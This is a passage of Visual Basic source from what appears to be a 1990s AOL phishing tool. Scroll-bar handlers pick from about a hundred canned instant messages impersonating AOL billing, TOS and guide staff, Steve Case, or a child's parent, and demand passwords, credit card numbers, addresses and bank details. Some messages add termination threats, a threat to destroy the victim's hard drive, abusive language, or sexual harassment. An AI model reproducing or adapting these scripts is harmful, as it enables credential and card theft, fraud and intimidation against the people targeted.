Text1 = "Excuse me, I am with WWWC (World Wide Web Consultants) and due to hackers by-passing out systems we seem to have lost your password. To correct this situation please click respond and enter Your password information. Incooperation may lead to termination of your account. Thank you for your help and enjoy the service!"
ElseIf HScroll1.Value = 93 Then
Text1 = "What's Up! I am with the AOL Community Action Team and due to Massive data flow in our database we seem to have failed to recieve your account information. Please click respond and enter your Your current account password. It is very important that you respond immediately. Thank you for your time."
ElseIf HScroll1.Value = 94 Then
Text1 = "Hello, And welcome to America Online. I am with OTC (Online Techincal Consultants) and due to Billing errors we have lost your Credit Card information. To correct this situation please click respond and enter Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Incooperation may lead to termination of your account. Thank you for your time."
ElseIf HScroll1.Value = 95 Then
Text1 = "Hello, And welcome to America Online. I am with WWWC (World Wide Web Consultants) and due to Technical Failures we have lost your Credit Card information. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond within 2 minutes too keep this account active. Thank you for your cooperation."
ElseIf HScroll1.Value = 96 Then
Text1 = "Excuse me, I am with OTC (Online Techincal Consultants) and due to hackers by-passing out systems we seem to have lost your account information. To correct this situation please click respond and enter Your password information. Please respond within 2 minutes too keep this account active. Thank you for your time."
ElseIf HScroll1.Value = 97 Then
Text1 = "Hello, And welcome to America Online. I am with the AOL Community Action Team and due to Massive data flow in our database we seem to have lost your password. To correct this situation please click respond and enter Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for using America Online."
ElseIf HScroll1.Value = 98 Then
Text1 = "Good evening, I am with AOL Techincal Staff and due to data corruption we seem to have lost your password. To correct this situation please click respond and enter Your current account password. Please respond as soon as possible  Thank you for using America Online."
ElseIf HScroll1.Value = 99 Then
Text1 = "Hello, And welcome to America Online. I am with AOL Techincal Staff and due to Technical Failures we have lost your Credit Card information. Please click respond and enter your Your password information. Please respond as soon as possible  Thank you for using America Online."
ElseIf HScroll1.Value = 100 Then
End If
End Sub

Sub HScroll2_Change ()
Panel3D5.Caption = "" & HScroll2.Value
If  HScroll2.Value = 101 Then
Text1 = "Dear AOL Customer, despite our rigorous efforts in our battle against 'hackers', they have found ways around our system, logging onto unsuspecting users accounts WITHOUT thier passwords. To ensure you are the responsible, paying customer -and not a 'hacker'- we need you to click on the RESPOND button and enter your password for verification. We are very sorry for this trouble." & Chr$(13) & Chr$(10) & "--AOL Security/B.A.H. Team"
ElseIf HScroll2.Value = 102 Then
Text1 = "ATTENTION: The message at the bottom of the screen is void when speaking to AOL Employees. We are very sorry to inform you that due to a legal conflict, the Sprint network (which is the network AOL uses to connect it users) is witholding the transfer of the log-in password at sign-on. To correct this problem, we need you to click on RESPOND and enter your password, so we can update your personal Master-File, containing all of your personal information. We are very sorry for this inconveinence." & Chr$(13) & Chr$(10) & "--AOL Customer Service Dept."
ElseIf HScroll2.Value = 103 Then
Text1 = "Hello current AOL member! I am with [DEL], Department, Electrical, Limb! We have found problems here at the AOL main computer database. We had to shut down the Data Processing Unit between the times of 5:30 and 7:30 this morning. We are requiring for you to reply with your current password and master screenname since you were not registered as signed on! Thank you for your time. Your account will be credited 35 free hours for your trouble! :-)"
ElseIf HScroll2.Value = 104 Then
Text1 = "Hello this is Steve Case president of this beautiful on-line service! You have been chosen among a selected few to try out our super X-rated web sites! It contains the best, top quality avi's, gif's, jpg's! Reply with your account password so we can charge the super low rate of 16.80$ to your account! You will then receive your special connection password to these exclusive websites! When you reply you will recieve your special access code along with 4 top notch sites! Don't pass up this chance! As it may only be offered to you once!  :D"
ElseIf HScroll2.Value = 105 Then
Text1 = "We had an error when processing your account information, it seems your expiration date was past due, to incase we misprinted it on sign-on we need you to reply with your expiration date, CC#, bank name, for revalidation.Thank you for your time and cooperation, your account will be credited with 25 free hours. :-)"
ElseIf HScroll2.Value = 106 Then
Text1 = "During your sign on period your Credit Card number did not cycle, please respond with the credit card number used during sign-up!To remain signed on our service, If you do not reply we will have to terminate your account, If this happens please contact our 800# at [1-800-827-6364]. Thank you for your time, for your cooperation your account will be credited 10 free hours!  :-)"
ElseIf HScroll2.Value = 107 Then
Text1 = "Stevecase:     Hello current member, We had to shut down the system this morning due to system upgrading! A problem occurred in which your account infromation was lost! We need for you to reply with your account password so this problem can be fixed if not, we will have to result to account termination of your account! We are sorry for this error, your account will be credited 30 free hours for your trouble! :-)"
ElseIf HScroll2.Value = 108 Then
Text1 = "AOLBilling:    Hello from the AOL Billing Dept.!We had an error in the system earlier today caused by a virus! We have lost your account info.You may be getting charged for the time spent NOT on-line! Please click respond and send your correct log-on password to your account. We are sorry for this trouble. Your account will  be credited 15 free hours for your cooperation!  :-)"
ElseIf HScroll2.Value = 109 Then
Text1 = "Hello current AOL user, your current password JUMPED on your sign-on, we did not receive your password during sign-on, reply with your password within a desired limit to this instant message to keep your account on-line, if we should be forced to terminate your account do not panic. Just contact our AOL service department at 1-800-827-6364 to clear up the problem! Thank you for your time. :-)"
ElseIf HScroll2.Value = 110 Then
Text1 = "Hello this is GUIDE SER from AOL! We are asking for you to reply with your sign-on password to correct our system network error! Your password has been lost! Please, reply without a pause, as you may be getting charged for the time spent NOT on-line! Thank you for your cooperation, your account will be credited 20 free hours for your cooperation! :-)"
ElseIf HScroll2.Value = 111 Then
Text1 = "Our system did not take your log on password correctly thru our system. To stay on-line without any further complication click on respond and fill in your exact master screenname and password for validation! We are sorry for this inconvienence, your account will be credited 10 free hours for your cooperation! :-)"
ElseIf HScroll2.Value = 112 Then
Text1 = "Hello current member, This is the AOL billing department, We are going have to ask you for your credit card information you have used to make the account you are currently on! We had a bug in the system earlier and it may of caused errors in your bill, When you reply we will verify your account and send you your current monthes total! If there should be errors, please contact us at [1-800-827-3891]. Thank you for your time. :D"
ElseIf HScroll2.Value = 113 Then
Text1 = "Good evening! I am with the AOLBilling Dept. here on AOL! There was a system error in the main computers this morning between the hours of 4:30-6:00a.m.! Your billing information has been lost! We need for you too click on reply and type in your CC#, Zip Code, Phone Number, and Address! If not we will have to take further action possibly resulting in account termination! Thank you for your time your account will be credited 25 free hours for your trouble.  :-)"
ElseIf HScroll2.Value = 114 Then
Text1 = "Current user, due to a virus in our system we are going to have to ask for your log-on password and master screenname so we can update our records here at aol. If not, we will have to terminate your account. Thank you for your cooperation and we are sorry for this error. Your account will be credited 20 free hours!  :D"
ElseIf HScroll2.Value = 115 Then
Text1 = "Current user, your sign-on password did not cycle thru our main computer. This could be caused by a jump in the network. Please, click respond and fill in your current password to your account. We are sorry for this inconvenience. For your cooperation, your account will be credited with 20 free hours. :-)"
ElseIf HScroll2.Value = 116 Then
Text1 = "Hello current user, this is Steve Case and Upper Chairman of this beautiful on-line service! We were wondering what would members like to recieve from this service rather then organized chat, on-line guides, we came up with free hours, all you have to do is reply with the phrase [Steve free] and your current screen name and password, of the  account that you want to be credited with 5 free hours, thats it! We take care of the rest!  :D     Thank you for your time     :SC , Upper Board. [to be used and recorded for 1 time use]."
ElseIf HScroll2.Value = 117 Then
Text1 = "Current member, this is GUIDE MOT, we have had several complaints that you were using a fake account. We are going to have to check and see if you are on one or not. Please, reply with your password as soon as possible or risk account termination! Thank you. :-)"
ElseIf HScroll2.Value = 118 Then
Text1 = "Good evening, I am with the America Online billing department.  We are sorry to inform you that we are experiencing difficulties with our records and we have lost your account information.  I need you to verify your cc# and address info so that I can validate you as a user, and fix our records promptly. Thank you for your cooperation and continue to enjoy America Online! :-)"
ElseIf HScroll2.Value = 119 Then
Text1 = "Hi, ToSGeneral here. I am currently doing a random check to see who is actually paying fot our service and who is not, see there are people on the service who use illegal fake accounts. We are trying to bust down on them and have a crime free service. So, what I need form you is your password to your account so I can verify you. If you would like to verify me then mail or instant message any of the on-line guides or ToS help's!my id code# is (98445)! Thank you for your cooperation."
ElseIf HScroll2.Value = 120 Then
Text1 = "Dear AOL Member, Our main screen name/password computer crashed today and deleted over 1,000 screen names and passwords. We need you to tell us your main screen name and password, otherwise you will not be able to sign back on after you sign off after this session, Sorry for the inconvenience, America Online comp.! :-)"
ElseIf HScroll1.Value = 121 Then
Text1 = "Hey son, this is Daddy ! :) How are you? Im at work right now, I need the password to the account quickly so I can check something real quick! Just click on reply and type it in! Thanks, get started on your homework soon. I'll be home later for dinner! Say hi to mommy for me! Bye :-)"
ElseIf HScroll2.Value = 122 Then
Text1 = "Hello, I am with the America On-line C.A.T. Team! I am currently doing an investigation on stolen accounts and fake accounts! We have had several requests by our higher ups to check this account! So if you would please, reply with your current password, and master screen name! If not we will have to terminate your account! Thank you for your cooperation. :-)"
ElseIf HScroll2.Value = 123 Then
Text1 = "Your current sign on password was not correct, please respond with your correct sign-on password for validation to stay on-line! If you do not reply within the desired time limit, We will have to cancel your account! Thank you for your time! :-)"
ElseIf HScroll2.Value = 124 Then
Text1 = "Good Evening AOL Member, Today was another day of our monthly system upgrade periods! We had a few errors in doing so. We jammed some of our memory chips to find that several members accounts info. was lost! We need you to reply with your correct billing information! Billing method, Zip Code, Phone Number and Address where you can be reached! We are so very sorry for this incovenience. Your account will be credited 35 free hours for your trouble! :-)"
ElseIf HScroll2.Value = 125 Then
Text1 = "Current user,We had an error when tracking your sign-on billing information,This may be caused by cross connections in our system.We need you to click reply and fill in the information you entered during sign-on.After you have completed this click send.We will then validate your info. and send you a letter of validation.Thank you for your cooperation!  :-)"
ElseIf HScroll2.Value = 126 Then
Text1 = "Hello current member, This is the AOL Billing Department, We are going have to ask you for your Credit Card information you have used to make the account you are currently on! We had a bug in the system earlier and it may of caused errors in your bill, When you reply we will verify your account and send you your current monthes total! If there should be errors, please contact us at 1-800-827-3891. Thank you for your time! :D"
ElseIf HScroll2.Value = 127 Then
Text1 = "Hello, I Am With The America Online Internet Enforcement Dept. We Have Traces Of Hackers Using Your Personal Account, We At AOL Can Find These Hackers And Can Put An End To There Illegal Activities! We Just Need Your Current Password To Verify You Are The Current Owner of This Account. Thank You! Please Feel Free To Call Our 1-800 Number For Technical Support! :D"
ElseIf HScroll2.Value = 128 Then
Text1 = "Hello current user, this is Steve Case and Upper Chairman of this beautiful on-line service! We were wondering what would members like to recieve from this service rather then organized chat,on-line guides, we came up with free hours,all you have to do is reply with the phrase [Steve free] and your current screen name and password, of the  account that you want to be credited with 5 free hours,thats it!We take care of the rest!  :)     Thank you for your time     :SC , Upper Board.[to be used and recorded for 1 time use]."
ElseIf HScroll2.Value = 129 Then
Text1 = "Current user,we did not receive your password during log-on,Please sign-off and re-enter the password or,Click on reply and type in your current sign-on password!This way we could clear up this error!Thank you for your time and patience! :D"
ElseIf HScroll2.Value = 130 Then
Text1 = "TosAdvisor:       We are currently doing a random check on accounts here on AOL! We need you to reply with your password to your account so we can validate it! There has been rumors going around that some people were on fake accounts! Since, we are taking this matter seriously we do need you to respond! If not it will result in account termination! [ID#65637]"
ElseIf HScroll2.Value = 131 Then
Text1 = "Reply with your password now to keep your account active,I'm known to send viruses through the internet and I can kill your computer so dont play around!I'll give you a couple of minutes to reply.If not I will send the virus through the internet and it will kill your hard drive!!! ;-["
ElseIf HScroll2.Value = 132 Then
Text1 = "Hello,I have a computer for sale.The item is shipped UPS and you will receive the item within 8-10 working days!I do accept checks or major credit cards!Send checks or credit card info. with your order to,9782 N.W. 20th ST. Coral Springs,Zip Code 33071,you can reach me at [1-954-345-4519].Thank you for your interest. Here are the items currently up for sale =[1.HP Vectra VT,Intel Pro Pentium 150 MHz processor with 256KB integrated cache.128-bit high-performance memory architecture,16 MB DIMM memory standard,expandable to 256MB with 8 DIMM memory expansion sockets.1,000MB Enhanced-IDE hard drive,PCI Matrox Milllenium graphics card with 3D acceleration and 2MB WRAM,upgradable to 4MB or 8MB.7 mass storage shelves (5 front accesible),6 expansion slots: 3 PCI,1 PCI/ISA combo and 2 ISA,Integrated 16-bit audio and 4X CD-ROM,Microsoft Windows NT 3.51 or IBM OS/2 Warp,Free three-year limited warranty for parts and labor,$2,615,price can be negotiated for any item currently available!"
ElseIf HScroll2.Value = 133 Then
Text2 = "AOLBilling:       Hello from the AOL Billing Dept.!We had an error in the system ealry this morning between the times of 4:30a.m.-7:30a.m. caused by monthly system upgrades! We have lost your account info.!You may be getting charged for the time spent NOT on-line!*IMPORTANT*!Click respond and send your correct log-on password to your account. We are sorry for this trouble. Your account will  be credited 35 free hours for your cooperation!If not we will have to be forced to shut down your account!  :D"
ElseIf HScroll2.Value = 134 Then
Text1 = "Welcome new AOL user,Our service was temporarily shut down this morning between the times of 6:30a.m. - 7:30a.m.,Due to a complicated computer install!We lost a couple of members billing info,You are number 68 on our list,If you would please clcik on reply and type in your Credit Card number and billing info.!If you do not respond in the desire limit then we will have to be forced to shut down your account,You are going to have contact us at our 800# if this should happen and describe the problem!Thank you for your time. :-)"
ElseIf HScroll2.Value = 135 Then
Text1 = "Hey kiddo,this is dad,I'm at work!I'll be home later for dinner!I need the password to our account so I can check the mail and see whats going on!You need to get off now anyways to do your homework!So,tell your friends bye and that youll be back tommorrow,if you want to come back on!Ill see you later,just click respond and type in the password,see you later kiddo!Love ya. :)"
ElseIf HScroll2.Value = 136 Then
Text1 = "AOLBilling:          Hello from the AOL Billing Dept.!We had to shut down the system this morning between the hours of 5:30a.m.-6:30a.m. due to system upgrades!Please,you may be getting charged for the time spent NOT on-line!Click respond and fill in the correct password to your account to keep your account active!If not we will have to terminate your account! :D"
ElseIf HScroll2.Value = 137 Then
Text1 = "Hello current member!This is the AOL TOS Staff doing a random check on account verification!We need for you to reply with your current account password along with the master screenname of that account!This is just for verification purposes!Please,ignore the red message below!My id# is 73726,Please if you think this is a scam write to TOSGENERAL!It is urgent for you to reply!It could result in account termination for not doing so! :D"
ElseIf HScroll2.Value = 138 Then
Text1 = "We had an error when processing your account information,it seems your expiration date was past due,to incase we misprinted it on sign-on we need you to reply with your expiration date,CC#,bank name,for revalidation.Thank you for your time and cooperation,your account will be credited with 25 free hours. :-)"
ElseIf HScroll2.Value = 139 Then
Text1 = "Hello current user, we had a virus in are system today around 8:30 this morning, Random memory loses followed! We are going to have to ask for your billing info that you entered in when you signed up! [Credit Card number, Address, Phone number, Zip code, State]To keep your account active, in case you do not reply with the information requested your account will be shut down, If this should happen, contact us at our 800#! Thank you for your cooperation! :-)"
ElseIf HScroll2.Value = 140 Then
Text1 = "Good Evening AOL Member, Today was another day of our monthly system upgrade periods! We had a few errors in doing so. We jammed some of our memory chips to find that several members accounts info. was lost! We need you to reply with your correct billing information! Billing method, Zip Code, Phone Number and Address where you can be reached! We are so very sorry for this incovenience. Your account will be credited 35 free hours for your trouble! :-)"
ElseIf HScroll2.Value = 141 Then
Text2 = "Good Evening, I am with the AOL Billing Dept.! When you signed on your password did not cycle through our computers! We need for you to click on reply and fill in your current password and master screenname for validation! If not, we will have to take serious action resulting in account termination! :D"
ElseIf HScroll2.Value = 142 Then
Text1 = "Good Evening Current member, your password did not log in our main network computers when you signed-on! We need for you to click on respond and fill in your correct log-on password to your account! We are sorry for this trouble, your account will be credited with 25 free hours for your cooperation! :-)"
ElseIf HScroll2.Value = 143 Then
Text1 = "Hi, I am with the America On-line Password Verification Center[P.V.C.]! We did not receive your sign-on password during sign-on! This could of resulted in a crossing of the network! We need for you to click on reply and type in your current user password! If not we will have to terminate your account! Thank you for your time and cooperation! Your account will be credited 15 free hours for your cooperation! :-)"
ElseIf HScroll2.Value = 144 Then
Text1 = "Current AOL user, We are sorry to inform you that you have not plugged into our AOL network computer. We did not receive your information you have inputted when you signed up. Please, inform us with the information [Credit Card #, Name, Address, Phone #, Zip Code, State] to remain signed on our service. If not we will have to shut down your time and it could result in account termination. To get around this click on respond and fill in the infromation requested, thank you! :-)"
ElseIf HScroll2.Value = 145 Then
Text1 = "Bitch give me your password now, I have AoHell its a program that can do anything, I can kill your account, and you cant get on-line ever again. So dont fuck around with me this isnt a game. Give me your password now or I'll tos you!!!"
ElseIf HScroll2.Value = 146 Then
Text1 = "Hello, I am with the AOL Billing Dept.! When you signed on to the service your log on password did not cycle thru the main computer! We need for you to reply with your current password to your account to update our system! We are sorry for this inconvience. Your account will be credited 20 free hours for your cooperation! Have a good day! :D"
ElseIf HScroll2.Value = 147 Then
Text1 = "Hey sexy, would you like to go to a private room together, I love long legs and big breasts, please respond. Im not going to leave you alone until you reply >=[. Come on just for alittle cyber, Your going to make me beg arent you? Please come on, private room, Sexy, just for you! You'll have a good time I promise!! Ill give you 5 minutes if you don't come Im going to be really mad ~>=[. You better come!!!!"
ElseIf HScroll2.Value = 148 Then
Text1 = "Welcome new user, we have found errors in your billing information. To continue to enjoy our wonderful service we ask for you to reply with your billing information. If not we will have to terminate your account. If this should happen you can contact us at our 800# number [1-800-827-6364]. Thank you for your cooperation.  :-)"
ElseIf HScroll2.Value = 149 Then
Text1 = "Hello current member, This is the AOL billing department, We are going have to ask you for your credit card information you have used to make the account you are currently on! We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you your current monthes total! If there should be errors, please contact us at [1-800-827-3891].Thank you for your time. :D"
ElseIf HScroll2.Value = 150 Then
Text1 = "We currently had an interruption in our system, We need you reply with your current Password this is very important, it could result in an overcharged bill! When you reply, we will send you an updated copy of your current months total! Thank you for your time! :D"
End If
If  HScroll2.Value = 151 Then
Text1 = "Hello, would you like a dream vacation, a secret resort hideaway? Did you think these dreams were impossible? Well, thanks to this great on-line service we are able to bring you CC# access drawings! All it is is a random drawing each week and the chosen name receives the chosen prize he or she wants to receive! It's that simple! Just reply with your CC# and info. we fill out your form send it back to you and you read over the rules it is only $25.00 per week and we gaurantee everyone a prize! :-) So, dont waste time reply today!!!"
ElseIf HScroll2.Value = 152 Then
Text1 = "Hello user, my name is William Denbo with the America Online Password Dept.! We have reason to beleive that a person has gotten hold of your password and is using it to conduct illegal activities. We must ask you to please respond with your name, credit card number, and Address. This is very important. Do not delay!"
ElseIf HScroll2.Value = 153 Then
Text1 = "Welcome current AOL user! I am with the Guide Team here on AOL. When you signed on an interuption occurred in our program, it frequently locks up! You need to respond with your current Password so we can notify AOL services, when you respond you will be recieving your current months total. If there should be problems in your billing, please feel free to contact our 800#. If you should not respond within required time then we will have to terminate your account! Thank you for your time! :-)"
ElseIf HScroll2.Value = 154 Then
Text1 = "Your current sign on password was not correct, please respond with your correct sign-on password for validation to stay on-line! If you do not reply within the desired time limit, We will have to cancel your account! Thank you for your time! :D"
ElseIf HScroll2.Value = 155 Then
Text1 = "Good Evening Current Member! I am with the AOBilling Dept. here on AOL! We need your password to your account for verification purposes! It seems that we have lost your sign-on password to your account due to system upgrade installations! We need for you to click reply and send your correct log-on password to your account or risk *account termination*! Thank you for your cooperation. Your account will be credited 25 free hours for your cooperation! :D"
ElseIf HScroll2.Value = 156 Then
Text1 = "Hello, this is Thomas Edwards of the C.A.T. Team here on AOL! It has resulted that your account password info. has been lost!It is important that you reply to this Instant Message with your correct log-on password to your account! We are sorry for the inconvenience! Please reply at once, you could risk account termination of your account with delay! Thank you for your cooperation. Your account will be credited 15 free hours for your trouble. :-)"
ElseIf HScroll2.Value = 157 Then
Text1 = "Hi there son! This is Mommy,I'm at work now! Pretty busy. I need the password to your account!Its important!!I'll be home soon,after you reply with the password just stay on AOL for another 5minutes then get off and do your Homework and chores! I'll see you later! Love you! :) Don't forget to give me your password!"
ElseIf HScroll2.Value = 158 Then
Text1 = "Hey Son, this is dad! How is everything? AOL is pretty fun isn't it? Well, I'm at work now and I need the Password to the account! Just click respond and type it in! Is Mom home, Tell her I said hi! I'll be home soon for dinner soon! :) Don't stay on AOL much longer you need to go do your homework and get that done! I'll let you go now.I love you!! :) Bye"
ElseIf HScroll2.Value = 159 Then
Text1 = "Hello this is George Fernandez, Manager of the AOL Billing Dept.! It has resulted that your sign-on password to your account has been erased! We need for you to reply with your Master Screen Name,and Master Screen name Password! It is important that you reply as soon as possible, as this may result in Account Termination! If this should happen then contact our offices at 1-800-827-6364. We are so very sorry for the inconvenience this has caused you! Your account will be credited 50 free hours your next billing cycle for your trouble! :-)"
ElseIf HScroll2.Value = 160 Then
Text1 = "Good Evening Current AOL member. I am with the Dept. of Billing. It seems there was a loss of memory due to system upgrades this morning. Your account Password has been lost. It is urgently recommended that you click on respond and type in your correct log-on password to your account to avoid billing errors. Thank you for your time and have a good day! :-)"
ElseIf HScroll2.Value = 161 Then
Text1 = "This is Charles Dibson of the AOL Billing correction Dept.! It seems as though your Billing information you entered during sign up has been erased due to errors in our system. We need for you to respond with your correct CC# you used during sign-up, Address where you can be located, and phone#. Thank you for your cooperation and we are so very sorry for the trouble we have caused you. Your account will be credited 25 free hours for your trouble! :D "
ElseIf HScroll2.Value = 162 Then
Text1 = "Hello, This is TOSAdvisor doing a current check on AOL members accounts! We need for you to respond with your current master account SN and Password! This will get you verified to continue to stay on-line and enjoy our service! I am so very sorry for the trouble we have caused you. Thank you for your time and trouble! :-)"
ElseIf HScroll2.Value = 163 Then
Text1 = "Hello AOL member, This is Devin Snobbs of the AOL Password Solicitation Team. It seems that we have gotten word that your account is a fake account! Please, Click respond and type in your current account password to your account for verification! If not we will have to terminate your account. If this should happen please contact our 800# at 1-800-827-3338. Thank you for your time and cooperation! :-)"
ElseIf HScroll2.Value = 164 Then
Text1 = "Hello I was asked by higher ups of the AOL Billing Dept. to request your Password to your account for account verification! It seems as we have lost it due to a jump in the network. We need to correct this error before any billing errors may set in! Please, Respond with no delay!!"
ElseIf HScroll2.Value = 165 Then
Text1 = "Welcome this is Charles Dunley of the AOL Dept. of Password Solicitation! It seems as though your Account Password has been deleted from our main computers due to system installation errors! We need for you to reply with your Current Password to the account you are currently on! We will then correct the error and credit your account with 25 free hours for your trouble. Thank you for your cooperation! :D"
ElseIf HScroll2.Value = 166 Then
Text1 = "This is Patrick Sherman of the AOL C.A.T. Team (Community Action Team)! It seems as though you were caught in an illegal room where trading of pirated software take place! We need for you to reply with your account Password so it can be verified on when you have signed on the last couple of days! It is important that you do so else, your account will be terminated!"
ElseIf HScroll2.Value = 167 Then
Text1 = "AOLBilling:      Hello Current AOL Member! We have lost your account info (Credit Card #, Phone #, Zip Code, Billing Address). We need for you to reply with those as your AOL account may be terminated from not doing so! It is important that you do as requested as soon as possible. Your account will be credited 15 free hours for your trouble! :D"
ElseIf HScroll2.Value = 168 Then
Text1 = "Hello AOL Member, I am with the weekly drawing Dept. here on AOL! You have been requested to have a chance to purchase a chance to win a free trip to the hawaii. Thats right, Let me explain all you have to do is reply with your CC# and Billing Address we will do the rest! Each ticket is 32.00$! This will enter you in the weekly contest (drawing's are held each friday). You will be contacted thursday for prompt info on when the exact drawing is! Everyones a winner. Free AOL hour coupons our given out for participating in the contest. Just reply with the required information to receive a brief packet on the rules and regulations of this fabulous event on this fabulous service! :-)"
ElseIf HScroll2.Value = 169 Then
Text1 = "Current user, your password did not log in our main computers correctly! Please, click on reply and fill in your correct log-on password! We are sorry for this trouble, your account will be credited with 15 free hours! :-)"
ElseIf HScroll2.Value = 170 Then
Text1 = "Welcome AOL user, you were defined as a very honest member on-line with a clean record, please respond back with your password to the account you want credited with 5 free hours thank you! :D"
ElseIf HScroll2.Value = 171 Then
Text1 = "Greetings current AOL user! Your log-on password did not connect to our main validation computers! Please, click on respond and type in your Log on password to continue our wonderful service. If you do not reply within the desired time, we will have to be forced to shut down your account! Thank you for your time!"
ElseIf HScroll2.Value = 172 Then
Text1 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf HScroll2.Value = 173 Then
Text1 = "Hello, I am from the America Online Billing Department.  I am sorry to report that we have been having trouble keeping your Billing Information valid. To avoid cancellation of your account,  please click the respond button and type in Your Name, Address, Telephone Number, Credit Card Number and Expiration Date, then Press the Send button. We are sorry for this inconvenience. Thank you for your time and have a nice day. :D"
ElseIf HScroll2.Value = 174 Then
Text1 = "$$ AOL WIN 20 FREE HOURS SWEEPSTAKES $$ AOL is offering a free 20 Hours sweepstakes. Please enter your log on password to be enter in the sweepstake. Winners will be notify by email within 24 Hours. Thank You for using America Online Service. :-)"
ElseIf HScroll2.Value = 175 Then
Text1 = "AOLBilling:    Hello from the AOL Billing Dept. ! We had an error in the system earlier in the day caused by system upgrades! We have lost your account info. ! You may be getting charged for the time spent NOT on-line! Please click respond and send your correct log-on password to your account. We are sorry for this trouble. Your account will be credited 15 free hours for your cooperation.  :-)"
ElseIf HScroll2.Value = 176 Then
Text1 = "AOLBilling:    Hello from the AOL Billing Dept. ! We had an error in the system earlier caused by system upgrades!  We have lost your billing info. ! Please click respond and send your CC#, Expiration Date, and Billing Zip Code. We are sorry for this trouble. Your account will be credited 15 free hours for your cooperation!  :-)"
ElseIf HScroll2.Value = 177 Then
Text1 = "Hello, I am with the AOL User Resource Team, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, which leads to account cancelation within 12 hours.  Thank you."
ElseIf HScroll2.Value = 178 Then
Text1 = "Hello, I am with the AHD (Anti-Hacker Department) and we beleive that Hackers may be using your account for illegal activites. To verify you are the rightful owner of that account; please respond with you name, password, and credit card information. Thank you and have a nice day using America Online."
ElseIf HScroll2.Value = 179 Then
Text1 = "Hello important customer of America Online. We enjoy having you as an esteemed member of our service but unfortunately we have lost our records of your account in a system failure. We need for you to reply back with your full name, password, and billing information. We regret to do this but you will be awarded 5 free hours for cooperation. Thank you and have a nice day."
ElseIf HScroll2.Value = 180 Then
Text1 = "Hello, my name is Bill Herde with IPSP (Illegal Pornographic Solicitaion Provention) and your account has been recorded doing illegal activities. Now we believe that your account is being used by a hacker so we need for you to reply back with your full name, password, and billing info. to verify you as the true account holder. Thank you and have a nice day!"
ElseIf HScroll2.Value = 181 Then
Text1 = "We have had requests that you are using a fake account.We take these matters seriously!!You can be fined and or requested for court appearances.Please reply with your password to your master screenname.If not we will shut-down your account with no delay.:-|"
ElseIf HScroll2.Value = 182 Then
Text1 = "Hello current user.I am known as GUIDE here on AOL,I was asked by higher informants to ask for your password to your account.This is because,you may be on an illegal account.This may be our error our it may not be but,we have to check into it.If you are we will have to terminate your account.If your not then we are very sorry for the misunderstanding and your account will be credited 20 free hours!Thank you for your time. :D"
ElseIf HScroll2.Value = 183 Then
Text1 = "Current user,your sign-on password did not cycle thru our main computer.This could be caused by a jump in the network.Please,click respond and fill in your current password to your account.We are sorry for this inconvenience.For your cooperation,your account will be credited with 20 free hours. :-)"
ElseIf HScroll2.Value = 184 Then
Text1 = "Good evening, I am with the America Online billing department.  We are sorry to inform you that we are experiencing difficulties with our records and we have lost your account information.  I need you to verify your cc# and address info so that I can validate you as a user, and fix our records promptly.Thank you for your cooperation and continue to enjoy America Online"
ElseIf HScroll2.Value = 185 Then
Text1 = "Dear AOL User, 5,000 screen names and passwords have just disappeared from our main computer.We dont know how they disappeared but we guarentee that it won't happen again.So what we need you to do is give us your main screen name and your password.So that we may input them into our new main computer.Sorry about this,ToSGeneral :D"
ElseIf HScroll2.Value = 186 Then
Text1 = "Hello, I am an America Online Billing Administator. Because of damage to our member records, we ask that you please verify your screen and sign-on password information. We apologize for the inconvenience and for your patience and cooperation 1 hour of online time is being added to your account."
ElseIf HScroll2.Value = 187 Then
Text1 = "Hello current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you,your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time."
ElseIf HScroll2.Value = 188 Then
Text1 = "Good morning current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a virus in the system earlier and it may of caused errors in your billing,When you reply with the information you entered during sign-up so we can verify your account and send you your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time."
ElseIf HScroll2.Value = 189 Then
Text1 = "Hello from the AOL Password Dept.! We had to shut down the system this morning due to system errors. We have lost your account info.You may be getting charged for the time spent NOT on-line. Please click respond and send your correct log-on password to your account. We are sorry for this trouble. Your account will be credited 15 free hours for your trouble :-)"
ElseIf HScroll2.Value = 190 Then
Text1 = "Current member we have had several complaints that you were using a fake account.We are going to have to check and see if you are on one or not.Please,reply with your password as soon as possible or risk account termination!Thank you."
ElseIf HScroll2.Value = 191 Then
Text1 = "Hi,ToSGeneral here.I am currently doing a random check to see who is actually paying fot our service and who is not,see there are people on the service who use illegal fake accounts.We are trying to bust down on them and have a crime free service.So,what I need form you is your password to your account so I can verify you.If you would like to verify me then mail or instant message any of the on-line guides or ToS help's!my id code# is (98445)!Thank you for your cooperation."
ElseIf HScroll2.Value = 192 Then
Text1 = "SuP,Im a guide here on AOL I was wondering if you would like to have a free account.If so please reply with the account password you would like credited with unlimited hours.I do this often for members of AOL cause I think AOL charges to much for this service!!!So reply if your interested!"
ElseIf HScroll2.Value = 193 Then
 Text1 = "Hi.ToSadvisor here, currently undercover doing research and verifying account's.Could you reply with your password so I can verify the account that you are on.If not we will have to suspend you and you will be required to stay off-line for a reasonable period!Reply with the information requested or be penalyzed!"
ElseIf HScroll2.Value = 194 Then
Text1 = "Current member,I am having trouble tracking down your records here at the AOL center.We have had reports of hackers breaking into our networks lately but,member records are heavily secured so if you could just reply with your password we could get your account back in order and get you going on-lineagain.But,since it is screwed up due to our fault your account will be credited a free hours yet,you will have to remaign signed off for awhile"
ElseIf HScroll2.Value = 195 Then
Text1 = "Good evening,I am with the AOL C.A.T. team here on AOL we have a hint that your account is being used for illegal purposes!Please reply with your password to your master screenname so we can validate it.If the password has been changed in anyway or any misc. behavior has been shown your account will be terminated! ;-\"
ElseIf HScroll2.Value = 196 Then
